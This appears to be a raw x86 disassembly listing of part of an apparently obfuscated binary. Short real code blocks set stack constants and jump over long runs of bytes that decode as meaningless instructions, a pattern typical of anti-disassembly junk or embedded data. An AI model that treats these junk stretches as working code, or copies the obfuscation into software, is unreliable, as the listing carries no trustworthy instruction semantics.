  4110ee:	mov    eax,DWORD PTR [ebp+0x10]
  4110f1:	imul   ecx,eax
  4110f4:	mov    eax,0xf52840d5
  4110f9:	div    ecx
  4110fb:	leave  
  4110fc:	ret    0xc
  4110ff:	push   ebp
  411100:	mov    ebp,esp
  411102:	sub    esp,0xc0
  411108:	push   esi
  411109:	mov    DWORD PTR [ebp-0x80],0x2f93
  411110:	mov    DWORD PTR [ebp-0x7c],0x3321
  411117:	mov    DWORD PTR [ebp-0x70],0x7d00
  41111e:	mov    DWORD PTR [ebp-0x6c],0xd87
  411125:	mov    DWORD PTR [ebp-0x60],0x4197
  41112c:	mov    DWORD PTR [ebp-0x5c],0xa7d
  411133:	mov    DWORD PTR [ebp-0x50],0x772d
  41113a:	mov    DWORD PTR [ebp-0x4c],0x37d8
  411141:	mov    DWORD PTR [ebp-0x40],0x414a
  411148:	mov    DWORD PTR [ebp-0x3c],0x55ef
  41114f:	mov    DWORD PTR [ebp-0x30],0x136b
  411156:	mov    DWORD PTR [ebp-0x2c],0x53e4
  41115d:	mov    DWORD PTR [ebp-0x20],0x32d8
  411164:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  41116b:	mov    DWORD PTR [ebp-0xc],0x3956
  411172:	mov    DWORD PTR [ebp-0xa4],0x4e57
  41117c:	mov    DWORD PTR [ebp-0x94],0x1
  411186:	mov    DWORD PTR [ebp-0x14],0x17ab
  41118d:	mov    DWORD PTR [ebp-0x64],0x7a3d
  411194:	mov    DWORD PTR [ebp-0x54],0x378a
  41119b:	mov    DWORD PTR [ebp-0x74],0x5a00
  4111a2:	mov    DWORD PTR [ebp-0x24],0x1f3a
  4111a9:	mov    DWORD PTR [ebp-0x84],0x9a225
  4111b3:	mov    DWORD PTR [ebp-0x44],0x31f8
  4111ba:	mov    DWORD PTR [ebp-0x34],0x3663
  4111c1:	mov    DWORD PTR [ebp-0xb4],0x3165
  4111cb:	mov    DWORD PTR [ebp-0xc0],0x1ebe
  4111d5:	mov    DWORD PTR [ebp-0xbc],0x43cc
  4111df:	jmp    0x411454
  4111e4:	mov    ecx,0x1c975440
  4111e9:	jnp    0x41119d
  4111eb:	push   ds
  4111ec:	jl     0x41125d
  4111ee:	mov    esi,DWORD PTR [eax+0x25]
  4111f1:	cmp    DWORD PTR [ebp+0x187ceebc],esp
  4111f7:	sbb    BYTE PTR [ecx+0x14],dh
  4111fa:	sbb    BYTE PTR [eax],bl
  4111fc:	xchg   ecx,eax
  4111fd:	pop    ebx
  4111fe:	cmp    ah,cl
  411200:	xchg   ecx,eax
  411201:	fistp  WORD PTR [ecx+0x5]
  411204:	stos   BYTE PTR es:[edi],al
  411205:	mov    esi,0xb2a57421
  41120a:	es xchg ebp,eax
  41120c:	mov    ecx,0x9b609dbd
  411211:	and    ebp,ecx
  411213:	push   ecx
  411214:	add    eax,0x1923c6a2
  411219:	aaa    
  41121a:	mov    bl,0xf2
  41121c:	adc    eax,0x71102c84
  411221:	into   
  411222:	aaa    
  411223:	out    dx,al
  411224:	mov    dl,BYTE PTR [edx]
  411226:	cmp    eax,0xda2eacc2
  41122b:	iret   
  41122c:	inc    esi
  41122d:	cmp    DWORD PTR [ebx-0x566b1b53],ecx
  411233:	push   ebp
  411234:	cmp    dh,dh
  411236:	xor    al,0x1
  411238:	pop    edx
  411239:	pop    eax
  41123a:	or     ebx,DWORD PTR [edi]
  41123c:	outs   dx,DWORD PTR ds:[esi]
  41123d:	cmc    
  41123e:	jmp    0x8c5f:0x22feba3d
  411245:	mov    ds:0xc226899a,al
  41124a:	pop    esp
  41124b:	sub    DWORD PTR [esp+eax*8],eax
  41124e:	sub    eax,0x7fe69652
  411253:	pop    esp
  411254:	push   0xd689cff2
  411259:	mov    ebx,0xb958d5e8
  41125e:	xchg   edx,eax
  41125f:	into   
  411260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411261:	pushf  
  411262:	mov    al,ds:0x1f849319
  411267:	mov    WORD PTR cs:[edx-0x757f35b5],es
  41126e:	pop    edi
  41126f:	sbb    ecx,esp
  411271:	aam    0xc9
  411273:	ins    BYTE PTR es:[edi],dx
  411274:	je     0x411265
  411276:	jbe    0x411287
  411278:	pop    ebp
  411279:	sub    edi,DWORD PTR [esi+ebp*8]
  41127c:	adc    al,0x98
  41127e:	mov    al,0x31
  411280:	inc    eax
  411281:	sub    DWORD PTR [edx-0x30d25336],edx
  411287:	cmc    
  411288:	cld    
  411289:	iret   
  41128a:	popf   
  41128b:	sub    eax,0x1fa35206
  411290:	outs   dx,BYTE PTR ds:[esi]
  411291:	fdiv   QWORD PTR [ecx]
  411293:	mov    edx,0xbdf6d96a
  411298:	mov    ebp,DWORD PTR [esi+0x1d2e0865]
  41129e:	das    
  41129f:	mov    esi,0x1f47c83d
  4112a4:	stc    
  4112a5:	add    BYTE PTR [ecx-0x7920244e],al
  4112ab:	add    eax,0x7579bcb0
  4112b0:	and    al,0xd0
  4112b2:	pop    esi
  4112b3:	mov    ch,0xc3
  4112b5:	add    esp,edi
  4112b7:	bnd jge 0x4112be
  4112ba:	(bad)  
  4112bb:	out    0x14,eax
  4112bd:	jmp    0x411311
  4112bf:	(bad)  
  4112c0:	out    0x21,al
  4112c2:	lea    esi,[edi+0x31a2f603]
  4112c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112c9:	std    
  4112ca:	push   edi
  4112cb:	add    bh,BYTE PTR [ebx+0x478badf1]
  4112d1:	fwait
  4112d2:	jg     0x4112ac
  4112d4:	jmp    0x4112c2
  4112d6:	dec    ebx
  4112d7:	iret   
  4112d8:	push   edx
  4112d9:	shl    ebp,cl
  4112db:	push   cs
  4112dc:	pop    ebx
  4112dd:	pop    ecx
  4112de:	(bad)  
  4112df:	call   FWORD PTR [ecx+0x68199841]
  4112e5:	mov    ebp,0xd5522f75
  4112ea:	mov    ah,0xeb
  4112ec:	int3   
  4112ed:	(bad)  
  4112ef:	lahf   
  4112f0:	sbb    al,0xa1
  4112f2:	xor    ebp,ebp
  4112f4:	dec    edi
  4112f5:	cdq    
  4112f6:	jne    0x4112be
  4112f8:	sbb    edx,eax
  4112fa:	cmp    BYTE PTR [ebp+0x56c59957],dl
  411300:	xchg   ebx,eax
  411301:	fmul   QWORD PTR [ebx+0x670d9616]
  411307:	stc    
  411308:	xor    ah,0x7c
  41130b:	adc    eax,0x5d58e358
  411310:	ja     0x4112a3
  411312:	push   0x3
  411314:	pop    es
  411315:	js     0x41137b
  411317:	test   ebx,esi
  411319:	imul   ecx,DWORD PTR ds:0x2c66767,0x870d1526
  411323:	xor    DWORD PTR [eax+0x6c],edi
  411326:	push   ebp
  411327:	push   cs
  411328:	push   cs
  411329:	(bad)  
  41132a:	mov    esp,0x3972ed35
  41132f:	adc    edx,ebp
  411331:	and    eax,0x73626866
  411336:	(bad)  
  411337:	fs inc esi
  411339:	cdq    
  41133a:	sar    dh,1
  41133c:	in     eax,dx
  41133d:	iret   
  41133e:	or     cl,dl
  411340:	inc    ebp
  411341:	ins    BYTE PTR es:[edi],dx
  411342:	mov    eax,0xc057f0ba
  411347:	fistp  QWORD PTR [eax]
  411349:	mov    ah,0xe5
  41134b:	dec    ebx
  41134c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41134e:	call   0x57c30c8
  411353:	jno    0x41137a
  411355:	sbb    ah,BYTE PTR [edx+0x18bc9425]
  41135b:	retf   
  41135c:	add    DWORD PTR [ebx+edi*8],edx
  41135f:	les    esi,FWORD PTR [edx+0x63]
  411362:	aas    
  411363:	xor    DWORD PTR [ecx+0x73927a2e],edi
  411369:	mov    BYTE PTR [edx+0x317115ad],ch
  41136f:	xor    esi,ecx
  411371:	xor    BYTE PTR [ecx],0x38
  411374:	push   es
  411375:	sub    DWORD PTR [eax],edx
  411377:	xchg   ebx,eax
  411378:	adc    eax,ecx
  41137a:	out    0xd6,eax
  41137c:	call   0x32c0:0xc97ffce0
  411383:	je     0x411390
  411385:	stos   BYTE PTR es:[edi],al
  411386:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411387:	ja     0x411370
  411389:	enter  0x1ff8,0x14
  41138d:	adc    al,0x10
  41138f:	ret    
  411390:	fldcw  WORD PTR [ebx]
  411392:	jmp    0x5b2:0x933aefc6
  411399:	mov    ah,0x82
  41139b:	out    0xf6,al
  41139d:	imul   edi,DWORD PTR [edx+0x45],0xccfab3e2
  4113a4:	sub    BYTE PTR [edi],ch
  4113a6:	cli    
  4113a7:	int    0xa0
  4113a9:	js     0x4113c0
  4113ab:	mov    WORD PTR [esi],es
  4113ad:	retf   
  4113ae:	xchg   edx,eax
  4113af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113b0:	xor    al,0xb2
  4113b2:	jecxz  0x411367
  4113b4:	mov    dl,0x13
  4113b6:	add    BYTE PTR [ebp-0x55],cl
  4113b9:	pop    ebx
  4113ba:	sbb    al,0x89
  4113bc:	mov    esi,0x211d0991
  4113c1:	add    esi,DWORD PTR [ebp+eax*4-0x5c]
  4113c5:	xor    DWORD PTR [eax+edx*8+0x2bd05a20],edi
  4113cc:	ds scas al,BYTE PTR es:[edi]
  4113ce:	mov    ch,dh
  4113d0:	popf   
  4113d1:	rcl    BYTE PTR [edx-0x5b1b94d6],cl
  4113d7:	or     DWORD PTR [edx-0x71],esi
  4113da:	jmp    0x55e76cc9
  4113df:	sahf   
  4113e0:	inc    ebp
  4113e1:	call   DWORD PTR ds:0xc7de13e
  4113e7:	and    bh,bh
  4113e9:	pop    edx
  4113ea:	fsub   DWORD PTR [ecx+0x35]
  4113ed:	pop    ebx
  4113ee:	sbb    eax,0x5a8c3b4a
  4113f3:	lods   eax,DWORD PTR ds:[esi]
  4113f4:	or     eax,0xcd17352
  4113f9:	xchg   ebp,eax
  4113fa:	pop    ds
  4113fb:	(bad)  
  4113fc:	gs lahf 
  4113fe:	shl    BYTE PTR [eax+ecx*2-0x49d5f75],1
  411405:	inc    edx
  411406:	mov    fs,WORD PTR [ecx+ecx*1]
  411409:	sbb    eax,0xb8ccf98f
  41140e:	pop    esp
  41140f:	and    al,0x7c
  411411:	int3   
  411412:	imul   edi,DWORD PTR [esi-0x7a],0x7d
  411416:	mov    ecx,0x8a063ec3
  41141b:	jecxz  0x4113af
  41141d:	jbe    0x41144a
  41141f:	push   ss
  411420:	pop    es
  411421:	sub    bl,dl
  411423:	repz arpl WORD PTR [edi+0x324eab6c],sp
  41142a:	inc    di
  41142c:	jnp    0x411458
  41142e:	fstp   QWORD PTR ds:0xdbf80847
  411434:	push   edi
  411435:	in     al,0x80
  411437:	sbb    DWORD PTR [edx-0x6f664e84],ebx
  41143d:	ss mov esp,0xd8ea438b
  411443:	cmp    BYTE PTR [edi-0xe],ah
  411446:	add    al,0x6c
  411448:	mov    BYTE PTR fs:[eax+edx*8-0x47a6f251],dl
  411450:	inc    edx
  411451:	sub    BYTE PTR [eax],0xcc
  411454:	mov    DWORD PTR [ebp-0xb0],0x7564
  41145e:	mov    DWORD PTR [ebp-0xac],0x18cf
  411468:	mov    DWORD PTR [ebp-0xa0],0x3135
  411472:	mov    DWORD PTR [ebp-0x9c],0x568d
  41147c:	mov    DWORD PTR [ebp-0x90],0x11f2
  411486:	mov    DWORD PTR [ebp-0x8c],0x63ea
  411490:	mov    DWORD PTR [ebp-0x10],0x3066
  411497:	mov    DWORD PTR [ebp-0x8],0x6ed2
  41149e:	push   0x7e1d
  4114a3:	jmp    0x411718
  4114a8:	dec    edi
  4114a9:	sub    bl,BYTE PTR [edx+0x3b209ab0]
  4114af:	sub    dl,BYTE PTR [eax+0x667e2188]
  4114b5:	stos   BYTE PTR es:[edi],al
  4114b6:	addr16 mov esp,0x18187847
  4114bc:	jno    0x4114d2
  4114be:	sbb    BYTE PTR [eax],bl
  4114c0:	mov    BYTE PTR [edi+0x4dbddf59],dl
  4114c6:	jge    0x41147f
  4114c8:	inc    edi
  4114c9:	jmp    0xc8069570
  4114ce:	push   ss
  4114cf:	xchg   BYTE PTR [ecx+ecx*1-0x5],cl
  4114d3:	cwde   
  4114d4:	mov    eax,0x63282466
  4114d9:	mov    ecx,0x8fca081b
  4114de:	mov    esi,0xb403b820
  4114e3:	cmp    al,0x78
  4114e5:	and    BYTE PTR [esi+0x5],0xbf
  4114e9:	fld    DWORD PTR [esi-0x80]
  4114ec:	fwait
  4114ed:	xchg   ecx,eax
  4114ee:	dec    ebx
  4114ef:	push   eax
  4114f0:	add    al,0xfa
  4114f2:	and    BYTE PTR [ebx-0x28],ah
  4114f5:	in     eax,0x5
  4114f7:	mov    dh,0x9
  4114f9:	mov    edx,0x52fef051
  4114fe:	lea    edi,[ebx]
  411500:	daa    
  411501:	scas   al,BYTE PTR es:[edi]
  411502:	ins    BYTE PTR es:[edi],dx
  411503:	aas    
  411504:	adc    dh,BYTE PTR [edi+0x54cb1975]
  41150a:	adc    ah,BYTE PTR [edi+0xdd56549]
  411510:	aaa    
  411511:	mov    eax,0xcf1426d8
  411516:	aam    0x32
  411518:	mov    BYTE PTR [ebp+0x51],al
  41151b:	adc    BYTE PTR [ebx+edx*8-0x7d],bl
  41151f:	imul   ebx,DWORD PTR [ecx*4-0x6b1793ce],0xd7e2c485
  41152a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41152b:	icebp  
  41152c:	and    eax,0xb9d9ad30
  411531:	nop
  411532:	mov    dh,0xe1
  411534:	gs xor eax,0x68cc0f43
  41153a:	imul   BYTE PTR [ecx+0x48]
  41153d:	push   ebp
  41153e:	popa   
  41153f:	cmp    edx,DWORD PTR [ebp+0x7d427b60]
  411545:	jmp    0x411549
  411547:	mov    BYTE PTR [ecx+esi*4+0x54],cl
  41154b:	inc    eax
  41154c:	adc    cl,BYTE PTR [edx+0x70]
  41154f:	cmp    eax,0x425b492a
  411554:	int    0x62
  411556:	xchg   esi,eax
  411557:	push   0x8acacb0e
  41155c:	addr16 sahf 
  41155e:	fld    TBYTE PTR [esi-0x2a]
  411561:	(bad)  
  411563:	scas   eax,DWORD PTR es:[di]
  411565:	aaa    
  411566:	xchg   DWORD PTR [ecx-0x1618b358],ecx
  41156c:	push   edi
  41156d:	das    
  41156e:	xchg   edi,eax
  41156f:	jb     0x411573
  411571:	xchg   di,ax
  411573:	stc    
  411574:	jg     0x411584
  411576:	clc    
  411577:	add    cl,BYTE PTR [eax+0x6a]
  41157a:	ins    BYTE PTR es:[edi],dx
  41157b:	mov    bh,0x6c
  41157d:	test   al,0x2a
  41157f:	jo     0x411552
  411581:	dec    ebp
  411582:	in     al,dx
  411583:	xchg   esi,eax
  411584:	in     eax,0x47
  411586:	dec    eax
  411587:	push   cs
  411588:	rcr    DWORD PTR [eax],1
  41158a:	ins    BYTE PTR es:[edi],dx
  41158b:	mov    al,ds:0x51039315
  411590:	fs mov cl,0xbb
  411593:	inc    ebx
  411594:	and    DWORD PTR [edx-0x6d],edi
  411597:	add    edi,0x7e
  41159a:	fld    DWORD PTR [eax]
  41159c:	sti    
  41159d:	push   esp
  41159e:	lea    esp,[ebx-0x43a9bd3]
  4115a4:	test   eax,0x8c30afd5
  4115a9:	adc    cl,BYTE PTR [ebx]
  4115ab:	cmp    DWORD PTR [ebx],esi
  4115ad:	xchg   edx,eax
  4115ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115af:	mov    ch,0xb2
  4115b1:	sbb    DWORD PTR [eax-0x122baf8d],edi
  4115b7:	(bad)  
  4115b8:	into   
  4115b9:	mov    eax,0x81345ea3
  4115be:	shr    DWORD PTR [ecx+0x20],0x22
  4115c2:	push   cs
  4115c3:	adc    al,0x75
  4115c5:	pop    ds
  4115c6:	cmp    DWORD PTR [edi+0x5f],esi
  4115c9:	mov    cs,WORD PTR [ebx]
  4115cb:	retf   
  4115cc:	lea    esp,[ecx+0x45e7819b]
  4115d2:	and    BYTE PTR [eax+0x37],bh
  4115d5:	test   eax,0x55aab6ba
  4115da:	imul   DWORD PTR [esi-0x72]
  4115dd:	arpl   WORD PTR [edi+0x3cb54512],bx
  4115e3:	lods   eax,DWORD PTR ds:[esi]
  4115e4:	cmc    
  4115e5:	ds aas 
  4115e7:	and    DWORD PTR [esi],edi
  4115e9:	xchg   edi,eax
  4115ea:	xchg   edi,eax
  4115eb:	test   al,0x57
  4115ed:	out    0xc7,al
  4115ef:	jmp    0x45dc:0x22087fc6
  4115f6:	sub    al,0xc2
  4115f8:	inc    edx
  4115f9:	pushf  
  4115fa:	inc    esp
  4115fb:	xlat   BYTE PTR ds:[ebx]
  4115fc:	loopne 0x41160a
  4115fe:	leave  
  4115ff:	outs   dx,WORD PTR ds:[esi]
  411601:	xor    ah,BYTE PTR ds:0xaa7cf571
  411607:	icebp  
  411608:	ins    DWORD PTR es:[edi],dx
  411609:	cdq    
  41160a:	push   esi
  41160b:	adc    ebp,DWORD PTR [ecx-0x42]
  41160e:	ret    
  41160f:	dec    ebx
  411610:	test   ch,0x57
  411613:	and    BYTE PTR [ecx+eax*4-0x29],bh
  411617:	push   ebp
  411618:	mov    DWORD PTR [ebx+0x68],esp
  41161b:	add    cl,BYTE PTR [edx+0x6c284329]
  411621:	clc    
  411622:	iret   
  411623:	cli    
  411624:	mov    cl,0xe4
  411626:	les    eax,FWORD PTR ds:0xc74bfd90
  41162c:	les    edi,FWORD PTR ds:0x904fb5e1
  411632:	mov    edi,0x13beb58f
  411637:	jl     0x411613
  411639:	cmp    al,BYTE PTR [esp+0x499df6bf]
  411640:	pop    edx
  411641:	aam    0x62
  411643:	adc    dh,dl
  411645:	pusha  
  411646:	add    BYTE PTR [edi+0x469afee7],ch
  41164c:	or     al,0xc9
  41164e:	mul    BYTE PTR [ecx]
  411650:	mov    dl,0x8e
  411652:	in     al,0xce
  411654:	in     al,0xd4
  411656:	out    dx,eax
  411657:	push   0x20
  411659:	add    al,0x8f
  41165b:	jle    0x41167d
  41165d:	or     ebx,DWORD PTR [esi-0x72]
  411660:	fisubr DWORD PTR [ecx+0x2af9a21e]
  411666:	add    eax,0x5f4986c4
  41166b:	mov    ds:0x3b234aa6,eax
  411670:	ss in  al,dx
  411672:	push   0x48d41ab
  411677:	outs   dx,DWORD PTR ds:[esi]
  411678:	dec    edx
  411679:	jmp    0x2483:0xfcf1f4e9
  411680:	aad    0x2f
  411682:	sub    DWORD PTR [ebx+0x22],eax
  411685:	or     eax,0x646ee286
  41168a:	(bad)  
  41168b:	mov    ds:0xf57d0aec,al
  411690:	cwde   
  411691:	pop    ebp
  411692:	hlt    
  411693:	inc    ebx
  411694:	es aas 
  411696:	stos   DWORD PTR es:[edi],eax
  411697:	mov    BYTE PTR ds:0x5380e834,al
  41169d:	xchg   esi,eax
  41169e:	sub    DWORD PTR [eax],edi
  4116a0:	pop    ebx
  4116a1:	test   BYTE PTR [eax],cl
  4116a3:	ror    DWORD PTR [ebx-0x58f40b15],cl
  4116a9:	mov    ch,0xeb
  4116ab:	inc    ecx
  4116ac:	icebp  
  4116ad:	mov    BYTE PTR [ecx-0x47e1d629],cl
  4116b3:	or     eax,DWORD PTR [edi+edx*4-0x33]
  4116b7:	jmp    0x9598d864
  4116bc:	ja     0x4116cf
  4116be:	dec    esi
  4116bf:	icebp  
  4116c0:	mov    ds:0x1b14be57,eax
  4116c5:	lahf   
  4116c6:	adc    cl,ch
  4116c8:	and    dl,BYTE PTR [esi]
  4116ca:	add    DWORD PTR [edx-0x68fb801b],ebp
  4116d0:	or     esi,ebx
  4116d2:	test   al,0xd8
  4116d4:	pop    edx
  4116d5:	retf   
  4116d6:	fnsave [esi-0x77]
  4116d9:	add    eax,0x29b1c739
  4116de:	(bad)  
  4116df:	enter  0xc324,0xb1
  4116e3:	sar    DWORD PTR [ebx+0x33496afd],0x9d
  4116ea:	xchg   ebx,eax
  4116eb:	pop    edx
  4116ec:	mov    ds:0xd5164f4c,al
  4116f1:	mov    ch,0xb5
  4116f3:	cs mov cl,0x3f
  4116f6:	sbb    al,0xb1
  4116f8:	cmp    ch,BYTE PTR [ebx+0x759bdcd5]
  4116fe:	iret   
  4116ff:	loop   0x41172d
  411701:	pop    ss
  411702:	leave  
  411703:	int3   
  411704:	push   ebx
  411705:	hlt    
  411706:	inc    esp
  411707:	mov    eax,ds:0xf1d6ed88
  41170c:	pushf  
  41170d:	dec    edi
  41170e:	retf   0xbeff
  411711:	mov    BYTE PTR [eax-0x48],dh
  411714:	outs   dx,BYTE PTR ds:[esi]
  411715:	jg     0x4116ee
  411717:	hlt    
  411718:	mov    DWORD PTR [ebp-0x4],0x30f4
  41171f:	mov    eax,DWORD PTR [ebp-0x20]
  411722:	mov    ecx,DWORD PTR [ebp-0x1c]
  411725:	push   0x5380
  41172a:	push   ecx
  41172b:	push   eax
  41172c:	call   0x416c20
  411731:	mov    ecx,eax
  411733:	mov    eax,DWORD PTR [ebp-0x30]
  411736:	xor    ecx,eax
  411738:	mov    esi,edx
  41173a:	mov    edx,DWORD PTR [ebp-0x2c]
  41173d:	mov    eax,DWORD PTR [ebp-0x40]
  411740:	xor    esi,edx
  411742:	jmp    0x4119b7
  411747:	lds    edi,FWORD PTR [ecx]
  411749:	fisubr WORD PTR [ebp+0x5a]
  41174c:	sbb    al,BYTE PTR [edx+0x21]
  41174f:	pusha  
  411750:	mov    al,ds:0xbf51aa57
  411755:	cli    
  411756:	mov    esi,0x1818749e
  41175b:	jno    0x411771
  41175d:	sbb    BYTE PTR [eax],bl
  41175f:	mov    eax,ds:0xd2f8a5c3
  411764:	xchg   edi,eax
  411765:	push   ecx
  411766:	stos   DWORD PTR es:[edi],eax
  411767:	pop    edx
  411768:	clc    
  411769:	add    eax,0xa5b4efea
  41176e:	aas    
  41176f:	pop    esp
  411770:	mov    ds:0xeb972cf6,al
  411775:	jmp    0x41174c
  411777:	adc    BYTE PTR [edx+0x1190d2b2],al
  41177d:	ret    0x78da
  411780:	ins    DWORD PTR es:[edi],dx
  411781:	xchg   DWORD PTR [edi+ecx*2],esi
  411784:	jle    0x41175d
  411786:	mov    esp,0xe5c9c57a
  41178b:	outs   dx,BYTE PTR ds:[esi]
  41178c:	test   DWORD PTR [edx],eax
  41178e:	and    al,0xc
  411790:	cmp    edx,DWORD PTR [edi]
  411792:	dec    esi
  411793:	mov    edx,0xc35e77a0
  411798:	and    BYTE PTR [eax],dl
  41179a:	mov    ecx,0x3b28d61e
  41179f:	imul   ebx,ecx,0x4a
  4117a2:	inc    eax
  4117a3:	cmp    esi,edi
  4117a5:	out    dx,al
  4117a6:	cs inc esi
  4117a8:	dec    ecx
  4117a9:	or     BYTE PTR [esi+0x30578697],ch
  4117af:	dec    ebp
  4117b0:	jl     0x4117c6
  4117b2:	inc    ebx
  4117b3:	mov    eax,0x747e66a0
  4117b8:	mov    WORD PTR ds:0xce781f2a,ss
  4117be:	xlat   BYTE PTR ds:[ebx]
  4117bf:	mov    ds,WORD PTR [ecx-0xc]
  4117c2:	sahf   
  4117c3:	sbb    al,0x5f
  4117c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117c6:	lods   eax,DWORD PTR ds:[esi]
  4117c7:	jle    0x4117a2
  4117c9:	addr16 xchg al,ch
  4117cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117cd:	imul   eax,DWORD PTR [ecx],0xf807e5ff
  4117d3:	mov    edx,0x2d816865
  4117d8:	xor    al,0xfc
  4117da:	add    ebx,DWORD PTR [edx+0x1e1a15a6]
  4117e0:	push   ds
  4117e1:	imul   eax,ecx,0xffffffa3
  4117e4:	dec    ecx
  4117e5:	stc    
  4117e6:	in     eax,0xe0
  4117e8:	dec    edi
  4117e9:	cli    
  4117ea:	loope  0x4117fc
  4117ec:	retf   
  4117ed:	jp     0x411849
  4117ef:	stos   DWORD PTR es:[edi],eax
  4117f0:	das    
  4117f1:	or     DWORD PTR [ebx-0x2963e79a],0x763c78ac
  4117fb:	fisubr WORD PTR [esp+eax*1+0x20]
  4117ff:	sub    eax,0x65cd7965
  411804:	jp     0x411822
  411806:	jae    0x411868
  411808:	pop    ecx
  411809:	cwde   
  41180a:	push   ebp
  41180b:	pop    esp
  41180c:	out    dx,eax
  41180d:	inc    ecx
  41180e:	dec    edi
  41180f:	shl    BYTE PTR [ebx],0xbf
  411812:	sar    edx,cl
  411814:	adc    ebp,DWORD PTR [ebx]
  411816:	or     ecx,DWORD PTR [ebp+0x19]
  411819:	pop    ecx
  41181a:	imul   ecx,DWORD PTR [edi-0x1f5c7013],0xe162b72a
  411824:	xor    BYTE PTR [esi+ecx*1],ah
  411827:	hlt    
  411828:	push   es
  411829:	into   
  41182a:	test   BYTE PTR [edx-0x29],bl
  41182d:	jg     0x41187f
  41182f:	inc    edx
  411830:	and    DWORD PTR [ebx-0x110324be],0xffffff9c
  411837:	fadd   st(1),st
  411839:	and    DWORD PTR [edi],ebp
  41183b:	xchg   ebx,eax
  41183c:	aaa    
  41183d:	imul   eax,DWORD PTR [ebp-0x6d],0x338f8ba2
  411844:	cmp    eax,0x11d6ae62
  411849:	das    
  41184a:	aaa    
  41184b:	fwait
  41184c:	xchg   DWORD PTR [edx-0x7c],eax
  41184f:	pusha  
  411850:	push   edx
  411851:	lahf   
  411852:	das    
  411853:	adc    BYTE PTR [ebp-0x415bd6af],bh
  411859:	lods   al,BYTE PTR ds:[esi]
  41185a:	sub    eax,0x75252d96
  41185f:	int    0x88
  411861:	daa    
  411862:	mov    ds:0x2c2a51db,al
  411867:	adc    eax,0xfd9261c8
  41186c:	push   edi
  41186d:	test   BYTE PTR [esi],cl
  41186f:	pop    ds
  411870:	fs mov al,0xc8
  411873:	and    DWORD PTR [ebx+edi*1-0x787e3ac0],eax
  41187a:	xchg   BYTE PTR [ebx-0x49],bh
  41187d:	add    al,0x3b
  41187f:	add    eax,0xf5372f94
  411884:	cmp    bl,BYTE PTR [eax+0x21c86fad]
  41188a:	inc    edi
  41188b:	hlt    
  41188c:	call   0xaf34:0xe78c2691
  411893:	(bad)  
  411894:	fimul  DWORD PTR [esi-0x25834174]
  41189a:	fdivr  DWORD PTR [edx-0x2dc3b425]
  4118a0:	outs   dx,BYTE PTR ds:[esi]
  4118a1:	mov    ds:0x7ffb446d,eax
  4118a6:	out    dx,eax
  4118a7:	mov    cl,0x56
  4118a9:	daa    
  4118aa:	shl    BYTE PTR [ebp+0x6c],0x6a
  4118ae:	imul   ecx,DWORD PTR [edx],0x970b9d0b
  4118b4:	push   0x21
  4118b6:	in     eax,dx
  4118b7:	lods   eax,DWORD PTR ds:[esi]
  4118b8:	cli    
  4118b9:	test   DWORD PTR cs:[ebp+0x75],0x2a96de28
  4118c1:	div    DWORD PTR [ebx+0x12ce2287]
  4118c7:	sbb    al,0xd4
  4118c9:	aas    
  4118ca:	sub    eax,0x9edda6a6
  4118cf:	sbb    ah,BYTE PTR [edx]
  4118d1:	add    bh,BYTE PTR [esi-0x5c5d174c]
  4118d7:	out    0xb5,al
  4118d9:	out    0x6,eax
  4118db:	je     0x4118fe
  4118dd:	stc    
  4118de:	cmp    BYTE PTR [edx+0x7b],dl
  4118e1:	cmp    al,0xcf
  4118e3:	mov    edx,DWORD PTR es:[ecx]
  4118e6:	or     al,0xb8
  4118e8:	(bad)  
  4118ea:	add    BYTE PTR [ebp-0x11],al
  4118ed:	inc    ecx
  4118ee:	or     BYTE PTR [edx+0x65419d5e],ch
  4118f4:	sub    DWORD PTR [edx+0x39c40381],eax
  4118fa:	or     al,0x81
  4118fc:	push   ss
  4118fd:	dec    ecx
  4118fe:	mov    bl,0xa3
  411900:	fild   WORD PTR [ebx]
  411902:	hlt    
  411903:	call   0x1bee:0x9d28ad50
  41190a:	mov    edi,cs
  41190c:	cmp    eax,0x39516adf
  411911:	loop   0x411918
  411913:	mov    eax,0x65e30c04
  411918:	(bad)  
  41191a:	push   edi
  41191b:	fsub   st(7),st
  41191d:	sub    ecx,DWORD PTR [edi]
  41191f:	or     BYTE PTR ds:0x4a7c6aa3,bh
  411925:	inc    ecx
  411926:	jle    0x411954
  411928:	inc    eax
  411929:	pop    ds
  41192a:	mov    edi,0x65384d36
  41192f:	(bad)  
  411930:	repz arpl WORD PTR [edx-0x78],ax
  411934:	mov    ch,0x2
  411936:	retf   0x5120
  411939:	aaa    
  41193a:	mov    ecx,0x5a0f0553
  41193f:	sub    BYTE PTR [ecx+0x582092f3],al
  411945:	in     eax,dx
  411946:	fisttp WORD PTR [edx-0x7dd5c177]
  41194c:	bound  edi,QWORD PTR [edi+0x349ec599]
  411952:	fisub  DWORD PTR [ecx]
  411954:	in     al,0xe8
  411956:	fcom   QWORD PTR [eax+ecx*4+0x6813c88]
  41195d:	pop    ss
  41195e:	ds clc 
  411960:	cmp    DWORD PTR [esi+0x49],esp
  411963:	adc    eax,0x5efd0bf
  411968:	fiadd  WORD PTR [ebx-0x6603d0c8]
  41196e:	mov    edi,0xcba78467
  411973:	(bad)  
  411974:	jg     0x4119c1
  411976:	loope  0x411935
  411978:	add    al,0xe8
  41197a:	sbb    BYTE PTR [ecx],al
  41197c:	mov    bh,0xef
  41197e:	sub    dh,dh
  411980:	scas   al,BYTE PTR es:[edi]
  411981:	fsubr  QWORD PTR [eax-0x70]
  411984:	pop    ecx
  411985:	push   0xffffffbd
  411987:	cmp    cl,BYTE PTR [ebp+0x51]
  41198a:	jne    0x411919
  41198c:	or     BYTE PTR [edi],ch
  41198e:	and    dl,BYTE PTR [edx+0x43b706e0]
  411994:	push   ecx
  411995:	mov    al,0xd4
  411997:	or     DWORD PTR [edi],esp
  411999:	mov    ds:0x38d02940,eax
  41199e:	leave  
  41199f:	mov    ebx,0xae668e26
  4119a4:	jns    0x41196d
  4119a6:	xor    ah,BYTE PTR [ebp-0x1698d2c4]
